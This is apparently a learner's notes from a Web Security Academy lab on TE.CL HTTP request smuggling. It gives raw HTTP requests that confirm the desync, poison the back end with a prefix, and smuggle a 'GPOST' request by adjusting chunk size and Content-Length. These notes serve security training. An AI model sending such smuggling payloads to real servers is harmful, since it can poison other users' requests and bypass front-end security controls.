/*

1) GET / HTTP/1.1
// send to repeater
// change request method

2) POST / HTTP/2
// downgrade to HTTP 1.1
// show non printable characters

3) back end uses content length
   front end uses chunked encoding

// turn off update content length option

4) confirm that the front end is using TE
POST / HTTP/1.1
Host: 0ac3002f041133ab833eb5b600530037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

// invalid request

5) confirm that the back end is using CL
POST / HTTP/1.1
Host: 0ac3002f041133ab833eb5b600530037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X

// timeout

6) Poison the back end with a prefix

POST / HTTP/1.1
Host: 0ac3002f041133ab833eb5b600530037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

1
G
0


// 200 ok
// front end knows the data is till G but back end thinks it's only till 1
// so the backend is now poisoned with the G prefix
// when we will send another normal request it will start with GPOST

7) POST / HTTP/2
Host: 0ac3002f041133ab833eb5b600530037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Transfer-Encoding: chunked

foo=bar


// "Unrecognized method G0POST"


8) Poison to make it GPOST by using another request in the post body request
// adjust the chunk size indicator 

POST / HTTP/1.1
Host: 0ac3002f041133ab833eb5b600530037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

56                                         | this is 4 bytes | we want the back end to think the request has ended here so pollution can be successfully be done by the queued GPOST request                       
GPOST / HTTP/1.1                                                  | this is 
Content-Type: application/x-www-form-urlencoded                   |   56
Content-Length: 5                                                 | bytes   | we will need to add 1 more to the content length to 6 so that the following normal requests begin with the concatenated prefix at the beginning of the normal request

0

// send
// 200 OK

now send the normal request
// 200 ok

9) Final adjustment, to 

POST / HTTP/1.1
Host: 0ac3002f041133ab833eb5b600530037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

// 200 OK


POST / HTTP/2
Host: 0ac3002f041133ab833eb5b600530037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Transfer-Encoding: chunked

foo=bar
// 
"Unrecognized method GPOST"

*/